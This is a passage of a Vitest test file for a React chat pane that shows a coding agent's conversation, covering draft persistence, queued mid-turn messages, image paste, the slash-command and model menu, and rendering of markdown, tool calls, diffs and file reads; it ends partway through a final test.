// @vitest-environment jsdom
import { describe, it, expect, afterEach, beforeAll, beforeEach, vi } from 'vitest'
import { render, screen, cleanup, waitFor, fireEvent, within } from '@testing-library/react'
import type { AcpClientMessage, AcpEvent, AcpQueuedPrompt, AcpToolCall } from '@yaac/shared/acp'

/**
 * jsdom has no ResizeObserver; the pane uses one to follow the tail when it
 * shrinks. This fake can be fired so the scroll-follow tests can simulate a
 * soft keyboard opening.
 */
const paneResized = new Set<() => void>()
beforeAll(() => {
  globalThis.ResizeObserver ??= class {
    private readonly fire: () => void
    constructor(cb: ResizeObserverCallback) {
      this.fire = () => cb([], this as unknown as ResizeObserver)
    }
    observe(): void { paneResized.add(this.fire) }
    unobserve(): void { paneResized.delete(this.fire) }
    disconnect(): void { paneResized.delete(this.fire) }
  }
})

/**
 * Draft persistence across unmounts (workspace stopped, tab closed, reload).
 * The tricky case is a draft that was sent but not yet echoed back, which
 * must not reappear in the box. The ACP hook is mocked; transport is covered
 * by use-acp-stream.test.tsx.
 */

const stream = {
  events: [] as AcpEvent[],
  busy: false,
  queued: [] as AcpQueuedPrompt[],
  connected: true,
  send: vi.fn((_msg: AcpClientMessage) => true),
  taskOutputs: {} as Record<string, { text?: string; error?: string }>,
}

vi.mock('#lib/acp', () => ({ useAcpStream: () => stream }))

import { WorkspaceChat } from '#components/WorkspaceChat'
import { chatDraftKey, flushChatDrafts, useUiStore } from '#lib/store'

const user = (seq: number, text: string): AcpEvent =>
  ({ type: 'user', seq, content: [{ type: 'text', text }] })

function box(): HTMLTextAreaElement {
  return screen.getByRole('textbox')
}

function type(text: string): void {
  fireEvent.change(box(), { target: { value: text } })
}

function show(workspaceId = 'w1', agentSessionId = 'acp-1'): ReturnType<typeof render> {
  return render(<WorkspaceChat workspaceId={workspaceId} agentSessionId={agentSessionId} />)
}

describe('WorkspaceChat drafts', () => {
  beforeEach(() => {
    stream.events = []
    stream.busy = false
    stream.connected = true
    stream.send.mockClear()
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('keeps a half-typed message when the pane is torn down and mounted again', async () => {
    show()
    type('the thing I was in the middle of')
    await waitFor(() =>
      expect(useUiStore.getState().chatDrafts[chatDraftKey('w1', 'acp-1')])
        .toEqual({ text: 'the thing I was in the middle of' }))

    cleanup()
    show()
    expect(box().value).toBe('the thing I was in the middle of')
  })

  it('keeps each conversation of a workspace separate', async () => {
    show('w1', 'acp-1')
    type('for the first agent')
    cleanup()

    show('w1', 'acp-2')
    expect(box().value).toBe('')
    type('for the second agent')
    cleanup()

    show('w1', 'acp-1')
    expect(box().value).toBe('for the first agent')
    await waitFor(() => expect(useUiStore.getState().chatDrafts).toEqual({
      [chatDraftKey('w1', 'acp-1')]: { text: 'for the first agent' },
      [chatDraftKey('w1', 'acp-2')]: { text: 'for the second agent' },
    }))
  })

  it('clears the box when the server echoes the message back', async () => {
    const { rerender } = show()
    type('ship it')
    fireEvent.click(screen.getByRole('button', { name: 'Send' }))
    expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: 'ship it' })
    // Sent but not yet confirmed, so the text stays.
    expect(box().value).toBe('ship it')

    // The echo confirms delivery and empties the box.
    stream.events = [user(0, 'ship it')]
    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
    await waitFor(() => expect(box().value).toBe(''))
    expect(useUiStore.getState().chatDrafts).toEqual({})
  })

  it('drops a restored draft the conversation shows was delivered', async () => {
    // Sent, then navigated away before the echo. The message did arrive, so
    // the replayed history wins over the saved draft.
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'already sent')
    useUiStore.getState().setChatSent('w1', 'acp-1', 'already sent')
    stream.events = [user(0, 'already sent')]
    show()
    await waitFor(() => expect(box().value).toBe(''))
    expect(useUiStore.getState().chatDrafts).toEqual({})
  })

  it('keeps a restored draft the conversation never received', async () => {
    // The socket dropped before the prompt got through, so the history ends
    // with something else and the text stays.
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'never made it')
    useUiStore.getState().setChatSent('w1', 'acp-1', 'never made it')
    stream.events = [user(0, 'an earlier message')]
    show()
    await waitFor(() => expect(box().value).toBe('never made it'))
  })

  it('keeps typed-but-unsent text that repeats what was already said', async () => {
    // Why the `sent` marker exists: short replies repeat. "ok" was sent and
    // answered; the user types "ok" again and leaves before sending. Nothing
    // was in flight, so the history says nothing about this text.
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok')
    stream.events = [user(0, 'ok'), { type: 'agent', seq: 1, content: [{ type: 'text', text: 'done' }] }]
    show()
    await waitFor(() => expect(box().value).toBe('ok'))
  })

  it('keeps an edited draft even when the original send was delivered', async () => {
    // The message arrived, but the box has been edited since, so its content
    // is new work.
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok')
    useUiStore.getState().setChatSent('w1', 'acp-1', 'ok')
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok, and one more thing')
    stream.events = [user(0, 'ok')]
    show()
    await waitFor(() => expect(box().value).toBe('ok, and one more thing'))
  })

  it('keeps a restored draft while the pane is still connecting', async () => {
    // There is nothing to compare against until the replay lands, so the
    // text is kept.
    stream.connected = false
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'unsent')
    show()
    await waitFor(() => expect(box().value).toBe('unsent'))
  })
})

/**
 * Messages sent while the agent works, as a TUI allows. The server adds each
 * to the running turn or queues it; the pane offers Send beside Stop and
 * shows the queue.
 */
describe('WorkspaceChat mid-turn', () => {
  beforeEach(() => {
    stream.events = [user(0, 'build it')]
    stream.busy = true
    stream.queued = []
    stream.connected = true
    stream.send.mockClear()
    stream.send.mockReturnValue(true)
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    stream.busy = false
    stream.queued = []
    cleanup()
    flushChatDrafts()
  })

  it('sends with Enter while the agent works, keeping Stop on offer', async () => {
    const { rerender } = show()
    // Grouped, so the row's spacing cannot push Stop away from Send.
    expect(screen.getByRole('button', { name: 'Stop turn' }).parentElement)
      .toBe(screen.getByRole('button', { name: 'Send' }).parentElement)
    type('use the staging config')
    fireEvent.keyDown(box(), { key: 'Enter' })
    expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: 'use the staging config' })

    // A steered message echoes like any other and clears the box.
    stream.events = [...stream.events, { type: 'user', seq: 1, content: [{ type: 'text', text: 'use the staging config' }], steered: true }]
    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
    await waitFor(() => expect(box().value).toBe(''))
  })

  it('clears the box once the message is queued, shows it, and lets it be dropped', async () => {
    const { rerender } = show()
    type('then write the docs')
    fireEvent.click(screen.getByRole('button', { name: 'Send' }))

    // Queued, not echoed: the box is free for the next message.
    stream.queued = [{ id: 'q1', text: 'then write the docs', images: 0 }]
    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
    await waitFor(() => expect(box().value).toBe(''))
    expect(screen.getByText('then write the docs')).toBeTruthy()

    fireEvent.click(screen.getByRole('button', { name: 'Remove queued message' }))
    expect(stream.send).toHaveBeenLastCalledWith({ type: 'unqueue', id: 'q1' })
  })

  it('drops a restored draft the server is holding in its queue', async () => {
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'queued before reload')
    useUiStore.getState().setChatSent('w1', 'acp-1', 'queued before reload')
    stream.queued = [{ id: 'q1', text: 'queued before reload', images: 0 }]
    show()
    await waitFor(() => expect(box().value).toBe(''))
  })
})

describe('WorkspaceChat width', () => {
  afterEach(() => {
    cleanup()
    useUiStore.getState().setChatFullWidth(false)
  })

  it('toggles between a centered column and full width, and remembers the choice', () => {
    show()
    const column = (): HTMLElement => box().closest('.rounded-xl')?.parentElement as HTMLElement
    expect(column().className).toContain('max-w-5xl')

    fireEvent.click(screen.getByRole('button', { name: 'Full-width chat' }))
    expect(column().className).not.toContain('max-w-')
    expect(localStorage.getItem('yaac.chatfullwidth.v1')).toBe('1')

    fireEvent.click(screen.getByRole('button', { name: 'Center chat' }))
    expect(column().className).toContain('max-w-5xl')
  })
})

describe('WorkspaceChat condensed view', () => {
  const agent = (seq: number, text: string): AcpEvent =>
    ({ type: 'agent', seq, content: [{ type: 'text', text }] })
  const tool = (seq: number, title: string, status: AcpToolCall['status'] = 'completed'): AcpEvent =>
    ({ type: 'tool', seq, call: { toolCallId: title, title, kind: 'other', status } })

  beforeEach(() => {
    stream.events = [
      user(0, 'first ask'),
      agent(1, 'looking around'),
      tool(2, 'ls'),
      tool(3, 'cat a'),
      agent(4, 'first answer'),
      user(5, 'second ask'),
      { type: 'thought', seq: 6, content: [{ type: 'text', text: 'hmm' }] },
      tool(7, 'grep b'),
      agent(8, 'now editing'),
      tool(9, 'edit c'),
      tool(10, 'run tests', 'in_progress'),
    ]
    stream.busy = true
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    useUiStore.getState().setChatCondensed(false)
  })

  it('folds all but the prompts, each turn’s last message and the live activity, and remembers the choice', () => {
    show()
    fireEvent.click(screen.getByRole('button', { name: 'Show key messages only' }))
    expect(localStorage.getItem('yaac.chatcondensed.v1')).toBe('1')
    for (const shown of ['first ask', 'first answer', 'second ask', 'now editing', 'edit c', 'run tests']) {
      expect(screen.getByText(shown)).toBeTruthy()
    }
    for (const hidden of ['looking around', 'ls', 'grep b']) expect(screen.queryByText(hidden)).toBeNull()

    // Each hidden run says what it holds, and opens in place.
    expect(screen.getByRole('button', { name: '1 tool call, 1 thought' })).toBeTruthy()
    fireEvent.click(screen.getByRole('button', { name: '1 message, 2 tool calls' }))
    expect(screen.getByText('looking around')).toBeTruthy()
    expect(screen.getByText('cat a')).toBeTruthy()

    // Once the turn ends, only its last message stays out.
    stream.busy = false
    cleanup()
    show()
    expect(screen.queryByText('edit c')).toBeNull()
    expect(screen.getByRole('button', { name: '2 tool calls' })).toBeTruthy()

    fireEvent.click(screen.getByRole('button', { name: 'Show every step' }))
    expect(screen.getByText('grep b')).toBeTruthy()
    expect(screen.queryByRole('button', { name: /tool call/ })).toBeNull()
  })

  it('ends a turn where the agent starts one itself, spans a steer, and never folds what needs the user', () => {
    stream.events = [
      user(0, 'q1'),
      agent(1, 'answer A'),
      { type: 'turn-end', seq: 2, stopReason: 'end_turn' },
      { type: 'agent-turn', seq: 3 },
      tool(4, 'bg check'),
      agent(5, 'message B'),
      user(6, 'q2'),
      tool(7, 't1'),
      {
        type: 'permission-request', seq: 8, thread: 'sub1', requestId: '1',
        toolCall: { toolCallId: 'p1', title: 'rm -rf build', kind: 'execute', status: 'pending' },
        options: [{ optionId: 'allow', name: 'Allow Once', kind: 'allow_once' }],
      },
      { type: 'error', seq: 9, message: 'adapter crashed' },
      tool(10, 't2'),
      agent(11, 'reply two'),
      { type: 'turn-end', seq: 12, stopReason: 'cancelled' },
      user(13, 'q3'),
      agent(14, 'working on it'),
      tool(15, 'long bash', 'in_progress'),
      { type: 'user', seq: 16, content: [{ type: 'text', text: 'also do X' }], steered: true },
      tool(17, 't3'),
    ]
    useUiStore.getState().setChatCondensed(true)
    show()
    for (const shown of [
      'answer A', 'message B', 'Permission needed', 'adapter crashed', 'turn ended: cancelled',
      'reply two', 'working on it', 'long bash', 'also do X', 't3',
    ]) expect(screen.getByText(shown)).toBeTruthy()
    for (const hidden of ['bg check', 't1', 't2']) expect(screen.queryByText(hidden)).toBeNull()
  })
})

/**
 * Images are sent inline in a message. jsdom decodes no images, so the
 * downscale's bitmap is faked; an image this small is sent unchanged.
 */
describe('WorkspaceChat images', () => {
  const PNG = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])
  const image = { type: 'image' as const, mimeType: 'image/png', data: 'iVBORw0KGgo=' }

  beforeAll(() => {
    globalThis.createImageBitmap ??= (() => Promise.resolve({ width: 8, height: 8, close: () => {} })) as
      unknown as typeof createImageBitmap
  })

  beforeEach(() => {
    stream.events = []
    stream.busy = false
    stream.connected = true
    stream.send.mockClear()
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('attaches a pasted image, sends it with the words, and clears both on the echo', async () => {
    const { rerender, container } = show()
    const file = new File([PNG], 'shot.png', { type: 'image/png' })
    fireEvent.paste(box(), { clipboardData: { types: ['Files'], files: [file], getData: () => '' } })
    await waitFor(() => expect(container.querySelectorAll('img')).toHaveLength(1))

    type('what is this?')
    fireEvent.click(screen.getByRole('button', { name: 'Send' }))
    expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: 'what is this?', images: [image] })

    // The echo draws the image in the conversation, and the composer clears
    // both the text and the image.
    stream.events = [{ type: 'user', seq: 0, content: [{ type: 'text', text: 'what is this?' }, image] }]
    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
    await waitFor(() => expect(box().value).toBe(''))
    expect(container.querySelectorAll('img')).toHaveLength(1)
    expect(screen.queryByLabelText('Remove image')).toBeNull()
  })

  it('leaves a paste that carries text to the box', () => {
    const { container } = show()
    const file = new File([PNG], 'cells.png', { type: 'image/png' })
    // What a spreadsheet puts on the clipboard: the cells, and a picture of them.
    const clipboard = (text: string): object => ({ types: ['text/plain', 'Files'], files: [file], getData: () => text })
    fireEvent.paste(box(), { clipboardData: clipboard('A1\tB1') })
    expect(container.querySelectorAll('img')).toHaveLength(0)
  })

  it('takes the image when the only text beside it is its URL, as Firefox copies one', async () => {
    const { container } = show()
    const file = new File([PNG], 'copied.png', { type: 'image/png' })
    fireEvent.paste(box(), {
      clipboardData: { types: ['text/plain', 'Files'], files: [file], getData: () => 'https://example.com/a.png' },
    })
    await waitFor(() => expect(container.querySelectorAll('img')).toHaveLength(1))
  })
})

/**
 * The `/` menu, fed by the session's `commands` and `models` events. Command
 * and model shapes follow what the pinned adapters advertise (claude's skills
 * as plain commands, codex's as `$name` mentions).
 */
describe('WorkspaceChat composer menu', () => {
  const session: AcpEvent[] = [
    {
      type: 'commands',
      seq: 0,
      commands: [
        { name: 'compact', description: 'Summarize the conversation', hint: '<instructions>' },
        { name: 'context', description: 'Show context usage' },
        { name: 'pr-comments', description: 'Fetch PR comments' },
        { name: 'run-yaac', description: 'Build and run yaac' },
        { name: 'run', description: 'Run the app' },
        { name: 'model', description: 'The agent\'s own picker', hint: '<model>' },
        { name: '$review-pr', description: 'Review a GitHub PR' },
      ],
    },
    {
      type: 'models',
      seq: 1,
      current: 'opus',
      models: [{ id: 'default', name: 'Default' }, { id: 'opus', name: 'Opus 5.5' }, { id: 'sonnet', name: 'Sonnet 5' }],
    },
  ]

  /** The menu's rows, as shown. */
  const rows = (): string[] => {
    const list = screen.queryByRole('listbox')
    return list === null ? [] : within(list).getAllByRole('option').map((b) => b.textContent ?? '')
  }
  /** Each row's label, without its description. */
  const labels = (): string[] =>
    within(screen.getByRole('listbox')).getAllByRole('option').map((b) => b.firstElementChild?.textContent ?? '')
  const key = (k: string): void => { fireEvent.keyDown(box(), { key: k }) }

  beforeEach(() => {
    stream.events = session
    stream.busy = false
    stream.connected = true
    stream.send.mockClear()
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('lists matching commands on /, prefix matches first, and runs one that takes no argument', () => {
    show()
    expect(rows()).toEqual([])
    type('/co')
    expect(labels()).toEqual(['/compact', '/context', '/pr-comments'])

    key('ArrowDown')
    key('Enter')
    expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: '/context' })
    // Held until the echo, like any message.
    expect(box().value).toBe('/context')
    expect(rows()).toEqual([])
  })

  it('ranks a fully typed command above longer ones it prefixes, so Enter runs that command', () => {
    show()
    type('/run')
    expect(labels()).toEqual(['/run', '/run-yaac'])
    key('Enter')
    expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: '/run' })
  })

  it('tells a screen reader which row is highlighted while the menu is open', () => {
    show()
    expect(box().getAttribute('aria-activedescendant')).toBeNull()
    type('/co')
    const options = within(screen.getByRole('listbox')).getAllByRole('option')
    expect(box().getAttribute('aria-controls')).toBe(screen.getByRole('listbox').id)
    expect(box().getAttribute('aria-activedescendant')).toBe(options[0].id)
    key('ArrowDown')
    expect(box().getAttribute('aria-activedescendant')).toBe(options[1].id)
  })

  it('opens on the running model even when hundreds are listed before it', () => {
    // opencode and pi offer hundreds of models; this one runs #151.
    const many = Array.from({ length: 300 }, (_, i) => ({ id: `m-${String(i)}` }))
    stream.events = [{ type: 'models', seq: 0, current: 'm-150', models: many }]
    show()
    type('/model ')
    const active = within(screen.getByRole('listbox')).getAllByRole('option')
      .find((o) => o.getAttribute('aria-selected') === 'true')
    expect(active?.textContent).toContain('m-150')
    expect(active?.textContent).toContain('current')
    key('Enter')
    expect(stream.send).toHaveBeenCalledWith({ type: 'model', modelId: 'm-150' })
  })

  it('completes a command that takes an argument instead of sending it, and Tab always completes', () => {
    show()
    type('/comp')
    key('Enter')
    expect(box().value).toBe('/compact ')
    expect(stream.send).not.toHaveBeenCalled()

    type('/cont')
    key('Tab')
    expect(box().value).toBe('/context ')
    expect(stream.send).not.toHaveBeenCalled()
  })

  it('switches the model from /model, marking the one running, and leaves the box empty', () => {
    show()
    type('/mod')
    // One /model: the pane's picker, in place of the agent's own.
    expect(rows()).toHaveLength(1)
    key('Enter')
    expect(box().value).toBe('/model ')
    expect(labels()).toEqual(['Default', 'Opus 5.5', 'Sonnet 5'])
    expect(rows()[1]).toContain('current')
    // Opens on the running model, so Enter alone changes nothing.
    expect(within(screen.getByRole('listbox')).getAllByRole('option')[1].getAttribute('aria-selected')).toBe('true')

    type('/model son')
    key('Enter')
    expect(stream.send).toHaveBeenCalledWith({ type: 'model', modelId: 'sonnet' })
    expect(box().value).toBe('')
  })

  it('offers codex skills on $ and inserts the mention for the message to follow', () => {
    show()
    type('/')
    expect(rows().some((r) => r.includes('review-pr'))).toBe(false)
    type('$rev')
    expect(rows()).toEqual([expect.stringContaining('$review-pr') as string])
    key('Enter')
    expect(box().value).toBe('$review-pr ')
    expect(stream.send).not.toHaveBeenCalled()
  })

  it('completes a command typed mid-message at the caret, without running it', () => {
    show()
    type('please /co')
    expect(labels()).toEqual(['/compact', '/context', '/pr-comments'])
    key('ArrowDown')
    key('Enter')
    expect(box().value).toBe('please /context ')
    expect(stream.send).not.toHaveBeenCalled()

    // The model picker is offered only at the start; a path offers nothing.
    type('use /mod')
    expect(rows()).toEqual([])
    type('see src/co')
    expect(rows()).toEqual([])
    type('open /tmp/co')
    expect(rows()).toEqual([])

    // A caret moved back into the text completes the word it ends.
    type('fix /cont then $rev it')
    box().setSelectionRange(9, 9)
    fireEvent.select(box())
    expect(labels()).toEqual(['/context'])
    key('Tab')
    expect(box().value).toBe('fix /context then $rev it')
    expect(box().selectionStart).toBe(13)
    box().setSelectionRange(22, 22)
    fireEvent.select(box())
    key('Tab')
    expect(box().value).toBe('fix /context then $review-pr it')
    expect(stream.send).not.toHaveBeenCalled()

    // Completing a word that is already complete still moves the caret past
    // its space, so the next keystroke lands there.
    type('fix /context then')
    box().setSelectionRange(12, 12)
    fireEvent.select(box())
    key('Tab')
    expect(box().value).toBe('fix /context then')
    expect(box().selectionStart).toBe(13)
  })

  it('sends a message that merely ends in a matching slash-word on Enter', () => {
    show()
    type('look at /co')
    expect(labels()).toEqual(['/compact', '/context', '/pr-comments'])
    key('Enter')
    expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: 'look at /co' })
  })

  it('closes on Escape until the draft changes, leaving Enter to send what was typed', () => {
    show()
    type('/co')
    key('Escape')
    expect(rows()).toEqual([])
    key('Enter')
    expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: '/co' })
  })
})

/**
 * How each kind of content renders: agent markdown, user text verbatim, tool
 * output, file reads as code, and edits as diffs that start expanded.
 */
describe('WorkspaceChat rendering', () => {
  const agent = (seq: number, text: string): AcpEvent =>
    ({ type: 'agent', seq, content: [{ type: 'text', text }] })

  const toolCall = (seq: number, call: Partial<AcpToolCall> & { toolCallId: string }): AcpEvent => ({
    type: 'tool',
    seq,
    call: { title: 'Tool', kind: 'other', status: 'completed', ...call },
  })

  beforeEach(() => {
    stream.events = []
    stream.busy = false
    stream.connected = true
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('puts the user on the left, verbatim', () => {
    // Rendered literally: a user typing `**not bold**` meant the asterisks.
    stream.events = [user(0, '**not bold**')]
    const { container } = show()
    expect(screen.getByText('**not bold**')).toBeTruthy()
    expect(container.querySelector('strong')).toBeNull()
    expect(container.querySelector('.justify-end')).toBeNull()
    expect(container.querySelector('.justify-start')).toBeTruthy()
  })

  it('renders the agent’s markdown as a document', () => {
    stream.events = [agent(0, '## Heading\n\nSome **bold** and `code`.\n\n- one\n- two\n')]
    const { container } = show()
    expect(container.querySelector('h2')?.textContent).toBe('Heading')
    expect(container.querySelector('strong')?.textContent).toBe('bold')
    expect(container.querySelector('code')?.textContent).toBe('code')
    expect(container.querySelectorAll('li')).toHaveLength(2)
  })

  it('renders a fenced block as highlighted code, without its backticks', () => {
    stream.events = [agent(0, 'run it:\n\n```ts\nconst x = 1\n```\n')]
    const { container } = show()
    const block = container.querySelector('pre code')
    expect(block?.textContent).toBe('const x = 1')
    expect(container.textContent).not.toContain('```')
    // Tokenized with the same classes the diff views use.
    expect(block?.querySelector('.tok-keyword')?.textContent).toBe('const')
  })

  it('renders a GFM table', () => {
    stream.events = [agent(0, '| a | b |\n| --- | --- |\n| 1 | 2 |\n')]
    const { container } = show()
    expect(container.querySelectorAll('th')).toHaveLength(2)
    expect(container.querySelectorAll('td')).toHaveLength(2)
  })

  it('marks a call running until it finishes, and interrupted if its turn ends first', () => {
    // claude's adapter keeps a running call `pending`, not `in_progress`.
    stream.events = [
      toolCall(0, { toolCallId: 't1', title: 'ls' }),
      toolCall(1, { toolCallId: 't2', title: 'sleep 50', kind: 'execute', status: 'pending' }),
    ]
    stream.busy = true
    const { rerender } = show()
    expect(screen.getAllByLabelText('running')).toHaveLength(1)
    expect(screen.queryByText('interrupted')).toBeNull()
    // The spinner takes the kind icon's slot rather than sitting beside it.
    const sleepRow = () => screen.getByText('sleep 50').closest('button')
    expect(sleepRow()?.querySelector('svg.lucide-loader-circle')).toBeTruthy()
    expect(sleepRow()?.querySelector('svg.lucide-square-terminal')).toBeNull()

    stream.events = [...stream.events, { type: 'turn-end', seq: 2, stopReason: 'cancelled' }]
    stream.busy = false
    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
    expect(screen.queryByLabelText('running')).toBeNull()
    expect(sleepRow()?.querySelector('svg.lucide-square-terminal')).toBeTruthy()
    expect(sleepRow()?.textContent).toContain('interrupted')
    expect(screen.getByText('ls').closest('button')?.textContent).not.toContain('interrupted')
  })

  it('never spins a call left over from an earlier turn', () => {
    // A replay on attach has no turn boundaries, so the call cancelled in turn
    // one is only known to be over because turn two's message follows it.
    stream.busy = true
    stream.events = [
      user(0, 'loop'),
      toolCall(1, { toolCallId: 't1', title: 'sleep 50', kind: 'execute', status: 'pending' }),
      user(2, 'again'),
      toolCall(3, { toolCallId: 't2', title: 'sleep 60', kind: 'execute', status: 'pending' }),
      // Steered into the running turn, so the call it lands beside keeps going.
      { type: 'user', seq: 4, content: [{ type: 'text', text: 'also check the logs' }], steered: true },
    ]
    show()
    expect(screen.getByText('sleep 50').closest('button')?.textContent).toContain('interrupted')
    expect(screen.getByText('sleep 60').closest('button')?.querySelector('[aria-label="running"]')).toBeTruthy()
  })

  it('reads an unfinished call as interrupted once no turn is running', () => {
    stream.busy = false
    stream.events = [toolCall(0, { toolCallId: 't1', title: 'sleep 50', kind: 'execute', status: 'pending' })]
    show()
    expect(screen.queryByLabelText('running')).toBeNull()
    expect(screen.getByText('interrupted')).toBeTruthy()
  })

  it('leaves a call waiting on a permission ask unmarked', () => {
    const call = { toolCallId: 't1', title: 'rm -rf build', kind: 'execute' as const, status: 'pending' as const }
    stream.busy = true
    stream.events = [
      toolCall(0, call),
      { type: 'permission-request', seq: 1, requestId: '5', toolCall: call,
        options: [{ optionId: 'allow', name: 'Allow', kind: 'allow_once' }] },
    ]
    show()
    expect(screen.queryByLabelText('running')).toBeNull()
    expect(screen.queryByText('interrupted')).toBeNull()
  })

  it('shows an edit as a diff, expanded, without being asked', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Edit a.ts',
      kind: 'edit',
      content: [{ type: 'diff', path: '/workspace/a.ts', oldText: 'one\ntwo\n', newText: 'one\nTWO\n' }],
    })]
    const { container } = show()
    // Context kept as context; only the changed line is +/−.
    expect(screen.getByText('one')).toBeTruthy()
    expect(screen.getByText('two')).toBeTruthy()
    expect(screen.getByText('TWO')).toBeTruthy()
    expect(container.querySelector('.diff-hl')).toBeTruthy()
    // The totals are on the row, so a collapsed edit still shows its size.
    expect(screen.getByText('+1')).toBeTruthy()
    expect(screen.getByText('−1')).toBeTruthy()
  })

  it('lets the reader close an edit, and reopen it', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Edit a.ts',
      kind: 'edit',
      content: [{ type: 'diff', path: '/workspace/a.ts', newText: 'hello\n' }],
    })]
    const { container } = show()
    expect(screen.getByText('hello')).toBeTruthy()
    fireEvent.click(screen.getByText('Edit a.ts'))
    expect(container.querySelector('.diff-hl')).toBeNull()
    fireEvent.click(screen.getByText('Edit a.ts'))
    expect(screen.getByText('hello')).toBeTruthy()
  })

  it('opens an edit that only becomes one on a later update', () => {
    // A tool call arrives `pending` and empty and gains content as it runs, so
    // the first event can't tell whether it is an edit.
    stream.events = [toolCall(0, { toolCallId: 't1', title: 'Edit a.ts', kind: 'edit', status: 'pending' })]
    const { container, rerender } = show()
    expect(container.querySelector('.diff-hl')).toBeNull()

    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Edit a.ts',
      kind: 'edit',
      content: [{ type: 'diff', path: '/workspace/a.ts', oldText: 'x', newText: 'y' }],
    })]
    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
    expect(container.querySelector('.diff-hl')).toBeTruthy()
  })

  it('leaves a non-edit tool call collapsed', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'ls',
      kind: 'execute',
      content: [{ type: 'text', text: '```console\na.ts\n```' }],
    })]
    show()
    expect(screen.queryByText('a.ts')).toBeNull()
    // Its output is markdown too: the adapter's fence around stdout renders as
    // a code block, not visible backticks.
    fireEvent.click(screen.getByText('ls'))
    expect(screen.getByText('a.ts')).toBeTruthy()
    expect(screen.getByText('a.ts').closest('div')?.textContent).not.toContain('```')
  })

  it('shows a command in full when its row is expanded, under its description', () => {
    const command = `git commit -m "${'long message '.repeat(20)}"`
    stream.events = [
      toolCall(0, { toolCallId: 't1', title: command, shell: true, kind: 'execute', status: 'completed' }),
      // codex files MCP calls under `execute` with no command: nothing to expand.
      toolCall(1, { toolCallId: 't2', title: 'mcp.github.get_issue', kind: 'execute', status: 'completed' }),
      toolCall(2, {
        toolCallId: 't3', title: 'git status', description: 'Show working tree status',
        shell: true, kind: 'execute', status: 'completed',
        // claude's adapter repeats the description as the call's content.
        content: [{ type: 'text', text: 'Show working tree status' }],
      }),
    ]
    show()
    fireEvent.click(screen.getByText(command))
    expect(screen.getAllByText(command).map((el) => el.tagName)).toEqual(['SPAN', 'PRE'])
    expect(screen.getByText('mcp.github.get_issue').closest('button')?.disabled).toBe(true)
    expect(screen.queryByText('git status')).toBeNull()
    fireEvent.click(screen.getByText('Show working tree status'))
    expect(screen.getByText('git status').tagName).toBe('PRE')
    expect(screen.getAllByText('Show working tree status')).toHaveLength(1)
  })

  it('shows a read as the file, highlighted for its path', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read a.ts',
      kind: 'read',
      locations: [{ path: '/workspace/a.ts' }],
      content: [{ type: 'text', text: '# not a heading\nconst x = 1\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read a.ts'))
    // Rendered as source: `#` is a line of the file, not a heading, and the
    // code is tokenized like the diff views.
    expect(container.querySelector('h1')).toBeNull()
    expect(container.querySelector('.diff-hl')?.textContent).toContain('# not a heading')
    expect(container.querySelector('.tok-keyword')?.textContent).toBe('const')
  })

  it('lifts a read’s line numbers into a gutter, out of the code', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read a.ts',
      kind: 'read',
      locations: [{ path: '/workspace/a.ts' }],
      // An agent's file reader prints a numbered gutter, and some adapters
      // wrap the whole thing in a fence.
      content: [{ type: 'text', text: '```\n   7→const x = 1\n   8→\n   9→export {}\n```\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read a.ts'))
    const block = container.querySelector('.diff-hl')
    expect(block?.textContent).toContain('const x = 1')
    expect(block?.textContent).toContain('export {}')
    // The numbers move to the gutter, out of the code.
    expect([...container.querySelectorAll('.w-10')].map((e) => e.textContent)).toEqual(['7', '8', '9'])
    expect(block?.textContent).not.toContain('→')
    // Nor are the adapter's backticks part of the file.
    expect(container.textContent).not.toContain('```')
  })

  it('shows a read that named no file as code anyway', () => {
    // A read's body is file text even when the adapter names no file. Without
    // a path it can't be highlighted, but it is still not markdown.
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read something',
      kind: 'read',
      content: [{ type: 'text', text: '## not a heading\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read something'))
    expect(container.querySelector('h2')).toBeNull()
    expect(screen.getByText('## not a heading')).toBeTruthy()
  })

  it('keeps a markdown file’s own fences', () => {
    // Unwrapping a lone fence assumes the backticks are an adapter's wrapper.
    // For a `.md` that is often wrong: a document whose body is one code
    // sample would lose real characters.
